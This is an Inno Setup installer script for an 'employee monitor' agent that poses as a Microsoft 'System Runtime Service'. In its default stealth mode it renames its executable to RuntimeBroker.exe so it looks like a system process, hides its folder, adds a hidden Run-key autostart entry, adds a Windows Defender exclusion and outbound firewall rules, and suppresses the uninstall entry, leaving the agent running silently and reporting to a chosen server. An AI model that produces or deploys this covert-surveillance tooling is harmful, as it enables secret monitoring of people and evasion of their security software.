; Employee Monitor Agent - Inno Setup Installer Script
; Professional wizard-style installer

#define MyAppName "System Runtime Service"
#define MyAppVersion "1.0"
#define MyAppPublisher "Microsoft Corporation"
#define MyAppExeName "EmployeeMonitor.exe"
#define StealthExeName "RuntimeBroker.exe"

[Setup]
AppId={{8F4E2A1B-3C5D-4E6F-8A9B-0C1D2E3F4A5B}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
DefaultDirName={autopf}\WindowsServices
DefaultGroupName={#MyAppName}
DisableProgramGroupPage=yes
OutputDir=installer_output
OutputBaseFilename=ServiceSetup
Compression=lzma2/ultra64
SolidCompression=yes
WizardStyle=modern
PrivilegesRequired=admin
DisableWelcomePage=no
WizardSizePercent=100
UninstallDisplayName=System Runtime Service
CreateUninstallRegKey=no
UpdateUninstallLogAppName=no

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Messages]
WelcomeLabel1=Welcome to Setup
WelcomeLabel2=This will install system components on your computer.%n%nClick Next to continue.
FinishedHeadingLabel=Setup Complete
FinishedLabel=The service has been successfully installed and is now running.

[Files]
Source: "dist\EmployeeMonitor\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs

[Code]
var
  ServerPage: TInputQueryWizardPage;
  ModePage: TInputOptionWizardPage;
  ServerName: String;
  ServerPort: String;
  InstallMode: Integer; // 0 = Stealth, 1 = Normal

function BoolToStr(Value: Boolean): String;
begin
  if Value then
    Result := 'true'
  else
    Result := 'false';
end;

procedure InitializeWizard;
begin
  // Server Configuration Page
  ServerPage := CreateInputQueryPage(wpWelcome,
    'Server Configuration',
    'Configure the connection settings',
    'Enter the server hostname or IP address where the admin panel is running.');
  ServerPage.Add('Server Address:', False);
  ServerPage.Add('Port (default 3847):', False);
  ServerPage.Values[0] := '';
  ServerPage.Values[1] := '3847';

  // Installation Mode Page
  ModePage := CreateInputOptionPage(ServerPage.ID,
    'Installation Mode',
    'Select how the service should be installed',
    'Choose the installation mode:',
    True, False);
  ModePage.Add('Background Service - Runs silently in the background');
  ModePage.Add('Standard Installation - Visible in system tray');
  ModePage.SelectedValueIndex := 0;
end;

function NextButtonClick(CurPageID: Integer): Boolean;
begin
  Result := True;

  if CurPageID = ServerPage.ID then
  begin
    ServerName := ServerPage.Values[0];
    ServerPort := ServerPage.Values[1];

    if ServerName = '' then
    begin
      MsgBox('Please enter a server address.', mbError, MB_OK);
      Result := False;
      Exit;
    end;

    if ServerPort = '' then
      ServerPort := '3847';
  end;

  if CurPageID = ModePage.ID then
  begin
    InstallMode := ModePage.SelectedValueIndex;
  end;
end;

procedure CreateConfigFile;
var
  ConfigPath: String;
  ConfigContent: String;
begin
  ConfigPath := ExpandConstant('{app}\config.json');
  ConfigContent := '{' + #13#10 +
    '  "server_host": "' + ServerName + '",' + #13#10 +
    '  "server_port": ' + ServerPort + ',' + #13#10 +
    '  "stealth_mode": ' + BoolToStr(InstallMode = 0) + #13#10 +
    '}';
  SaveStringToFile(ConfigPath, ConfigContent, False);
end;

procedure SetupStealthMode;
var
  ExePath: String;
  NewExePath: String;
  ResultCode: Integer;
begin
  ExePath := ExpandConstant('{app}\{#MyAppExeName}');
  NewExePath := ExpandConstant('{app}\{#StealthExeName}');

  // Rename executable to look like system process
  if FileExists(ExePath) then
    RenameFile(ExePath, NewExePath);

  // Hide the installation folder
  Exec('attrib', '+h "' + ExpandConstant('{app}') + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // Add to registry for auto-start (hidden)
  RegWriteStringValue(HKEY_CURRENT_USER,
    'Software\Microsoft\Windows\CurrentVersion\Run',
    'WindowsRuntime',
    '"' + NewExePath + '" --server ' + ServerName + ' --port ' + ServerPort);

  // Add Windows Defender exclusion
  Exec('powershell', '-Command "Add-MpPreference -ExclusionPath ''' + ExpandConstant('{app}') + '''" ', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // Start the service
  Exec(NewExePath, '--server ' + ServerName + ' --port ' + ServerPort, '', SW_HIDE, ewNoWait, ResultCode);
end;

procedure SetupNormalMode;
var
  ExePath: String;
  StartupPath: String;
  ResultCode: Integer;
begin
  ExePath := ExpandConstant('{app}\{#MyAppExeName}');
  StartupPath := ExpandConstant('{userstartup}\System Service.lnk');

  // Add to HKLM registry for auto-start (all users)
  RegWriteStringValue(HKEY_LOCAL_MACHINE,
    'Software\Microsoft\Windows\CurrentVersion\Run',
    'SystemRuntimeService',
    '"' + ExePath + '" --server ' + ServerName + ' --port ' + ServerPort);

  // Create startup shortcut as fallback
  Exec('powershell', '-Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(''' + StartupPath + '''); $s.TargetPath = ''' + ExePath + '''; $s.Arguments = ''--server ' + ServerName + ' --port ' + ServerPort + '''; $s.WorkingDirectory = ''' + ExpandConstant('{app}') + '''; $s.Save()"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // Start the service
  Exec(ExePath, '--server ' + ServerName + ' --port ' + ServerPort, '', SW_HIDE, ewNoWait, ResultCode);
end;

procedure AddFirewallRule;
var
  ResultCode: Integer;
begin
  // Add outbound firewall rule
  Exec('netsh', 'advfirewall firewall add rule name="Windows Runtime" dir=out action=allow program="' + ExpandConstant('{app}') + '\' + ExpandConstant('{#MyAppExeName}') + '" enable=yes', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('netsh', 'advfirewall firewall add rule name="Windows Runtime" dir=out action=allow program="' + ExpandConstant('{app}') + '\' + ExpandConstant('{#StealthExeName}') + '" enable=yes', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
end;

procedure CurStepChanged(CurStep: TSetupStep);
begin
  if CurStep = ssPostInstall then
  begin
    CreateConfigFile;
    AddFirewallRule;

    if InstallMode = 0 then
      SetupStealthMode
    else
      SetupNormalMode;
  end;
end;

procedure CurUninstallStepChanged(CurUninstallStep: TUninstallStep);
var
  ResultCode: Integer;
begin
  if CurUninstallStep = usUninstall then
  begin
    // Kill the process
    Exec('taskkill', '/F /IM {#MyAppExeName}', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    Exec('taskkill', '/F /IM {#StealthExeName}', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

    // Remove registry entries
    RegDeleteValue(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', 'WindowsRuntime');
    RegDeleteValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', 'SystemRuntimeService');
    RegDeleteValue(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', 'EmployeeMonitor');

    // Remove firewall rules
    Exec('netsh', 'advfirewall firewall delete rule name="Windows Runtime"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

    // Remove Defender exclusion
    Exec('powershell', '-Command "Remove-MpPreference -ExclusionPath ''' + ExpandConstant('{app}') + '''"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

    // Unhide folder
    Exec('attrib', '-h "' + ExpandConstant('{app}') + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  end;
end;
